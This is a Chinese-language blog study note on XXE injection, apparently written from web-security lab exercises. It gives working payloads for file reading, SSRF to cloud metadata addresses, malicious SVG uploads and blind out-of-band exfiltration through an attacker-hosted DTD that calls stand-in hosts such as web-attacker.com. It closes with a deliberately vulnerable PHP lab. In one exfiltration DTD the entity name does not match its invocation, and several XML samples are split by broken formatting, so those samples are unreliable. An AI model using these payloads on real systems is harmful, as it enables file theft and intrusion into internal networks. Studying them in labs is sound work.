---
title: "XXE 外部实体注入"
slug: "xxe-injection"
date: 2026-08-27T17:25:53+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从文件读取、SSRF 到盲 XXE，系统梳理外部实体注入的利用面与检测方法。"
summary: "从文件读取、SSRF 到盲 XXE，系统梳理外部实体注入的利用面与检测方法。"
tags: ["XXE", "Web安全", "SSRF"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 1
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/1.XML外部实体(XXE)注入(如检查库存).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/xxe-injection/workflow.svg" alt="XML 实体在解析阶段读取本地文件或发起内网请求，再通过回显或外带通道输出。" loading="lazy">
  <figcaption>图 1 · XXE 外部实体与盲外带。XML 实体在解析阶段读取本地文件或发起内网请求，再通过回显或外带通道输出。</figcaption>
</figure>

## 1. 利用XXE获取文件

- (1)引入一个定义包含文件路径的外部实体元素DOCTYPE
- (2)编辑应用程序响应中返回的XML中的数据值，以利用定义的外部实体
  - 如:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
<stockCheck><productId> &xxe;</productId></stockCheck>
```

## 2. 利用XXE进行SSRF攻击

- 如：外部实体会促使服务器向组织基础设施内的内部系统发出后端HTTP请求:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ] >
```

  - 如:"http://internal.vulnerable-website.com/"
  - 换成->"http://169.254.169.254/"
  - 换成->"http://169.254.169.254/latest"
  - ......

## 3. 盲目XXE漏洞

- 许多XXE漏洞实例是盲目的。这意味着应用程序在响应中不会返回任何定义的外部实体的值，因此无法直接检索服务器端文件
  - (1)out-of-band techniques(OAST)
  - (2)触发XML解析错误，导致错误信息中暴露敏感数据

## 4. 寻找XXE注入的隐藏攻击面

- (1)Xlinclude袭击
  - productId=

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

- (2)通过文件上传XXE攻击
  - 一些常见的文件格式使用XML或包含XML子组件。基于XML的格式示例包括办公文档格式如DOCX和图像格式如SVG
    - 可以提交恶意SVG图像
  - 方法：1)创建一个文本文档
    - 2)把攻击代码贴贴进去

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ] >
```

    - 或file:///etc/passwd
    - 或file:///c:/windows/win.ini

```xml
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
```

    - </svg>
- (3)通过修改内容类型的XXE攻击
  - 如原POST请求
  - Content-Type:application/x-www-form-urlencoded
  - Content-length:7

  - foo=bar
  - 可以改为
  - Content-Type:text/xml
  - Content-length:52

```xml
<?xml version="1.0" encoding="UTF-8" ?><foo>bar</foo>
```

## 5. (1)使用带外(OAST)技术检测盲XXXE

- 你通常可以用与XXE SSRF攻击相同的技术检测盲XXE,但通过触发带外网络与你控制的系统的交互。如：
  - 定义一个外部实体：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ] >
```

  - 然后你会在XML中利用定义的实体作为数据值
  - 该XXE攻击会使用服务器向指定的URL发送后端HTTP请求。攻击者可以监控由此产生的DNS查询和HTTP请求，从而检测到XXE攻击是否攻击成功
  - 题目：解法
  - Burp Collaborator子域名：
  - 一个工具，能临时生成一个独一无二的域名
  - 在盲XXE里，目标服务器不会把访问结果返回到页面，我们看不见，所以我们需要用这种“带外”的方式，让服务器去访问这个只有你知道的域名，然后你去Burp Collaborator里看一眼，有没有人找过它。如果有，就证明漏洞存在
  - 如：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ] >
```

```xml
<stockCheck>
<productId>
```

        - &xxe;
      - </productId>

```xml
<storeId>
```

        - 1
      - </storeId>
    - </stockCheck>
    - (其中里面的Burp-Collaborator-subdomain改为burp collaborator的子域名:1.Copy to clipboard 2.Repeater后Poll now)

  - 在应用程序进行了某些输入验证或对所使用的XML解析器进行加固的情况下，用XML参数实体替代（只能在DTD的其他地方被引用）：
  - 如：

```xml
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ] >
<stockCheck>
<productId>1</productId>   <!-- 注意：参数实体触发在DTD内部，此处可保持原值不变 -->
<storeId>1</storeId>
```

  - </stockCheck>
- （若使用标准实体 &xxe;，则必须将 <productId>1</productId> 改为 <productId>&xxe;</productId>）

## 5. (2)利用盲式XXE漏洞，通过带外通道窃取数据

- 在其控制的系统上托管恶意DTD，然后从带内XXE负载内调用该外部DTD
- 恶意DTD用于窃取文件内容的一个示例如下：
- 如:/etc/passwd

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25;exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
```

- %eval;
- %exfil;
- 向受攻击的应用提交以下XXE有效载荷:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;  ] >
```

- 该XXE负载声明调用的XML参数实体，并在DTD内使用该实体。这会导致XML解析器从攻击者服务器获取外部DTD并内联解释。随后执行恶意DTD中定义的步骤，文件被传输到攻击者的服务器。
- 流程如下：
  - 1.生成恶意DTD并保存到漏洞利用服务器
    - 在实验室点击 "Go to exploit server"，将 Body 设为以下内容（注意把 collaborator 域名替换进去）：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25;exfiltrate SYSTEM 'http://YOUR-BURP-COLLABORATOR.oastify.com/?x=%file;'>">
```

    - %eval;
    - %exfil;

    - 然后保存为 /exploit.dtd，记下完整URL（如 https://exploit-xxxx.exploit-server.net/exploit.dtd）
    - 保存：例/exploit.dtd后记下完整的URL
  - 2.Burp拦截POST请求

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-xxxx.exploit-server.net/exploit.dtd"> %xxe; ] >
```

  - （注意：这里用的是漏洞利用服务器的URL，而不是Collaborator）
  - 3.发送请求后，回到 Burp Collaborator 标签页，点击 "Poll now"。
  - 如果成功，你会在 HTTP 交互记录里看到类似 GET /?x=root（或hostname内容）的请求。

## 可复现补充

## 6. 本地完整复现

准备一个启用外部实体的 PHP 环境：

```bash
mkdir -p /tmp/xxe-lab
cd /tmp/xxe-lab
```

创建 `index.php`：

```php
<?php
libxml_disable_entity_loader(false);
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
echo $dom->textContent;
```

启动：

```bash
docker run --rm -d --name xxe-lab \
  -p 8080:80 \
  -v /tmp/xxe-lab:/var/www/html \
  php:7.4-apache
```

## 7. 验证文件读取

```bash
curl -i -sS -X POST 'http://127.0.0.1:8080/' \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'
```

预期响应包含 `/etc/passwd` 内容。

## 8. 验证 SSRF

先在授权监听端：

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

发送：

```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/xxe-probe">]>
<data>&xxe;</data>
```

监听端收到请求，说明解析器确实发起了后端连接。

## 9. 盲 XXE 外带

恶意 DTD `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8000/?data=%file;'>">
%eval;
%exfil;
```

请求：

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://127.0.0.1:8000/evil.dtd">
  %remote;
]>
<data>test</data>
```

注意：外部 DTD 和参数实体支持取决于解析器和配置。

## 10. 常见失败

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| DTD 被禁 | 解析器关闭外部实体 | 停止，不要反复换 payload |
| `&xxe;` 原样输出 | 没有 `LIBXML_NOENT` | 确认解析参数 |
| 文件为空 | 路径/权限不对 | 先读 `/etc/passwd` |
| 无外带 | 目标不出网 | 用 DNSLog/内网监听 |
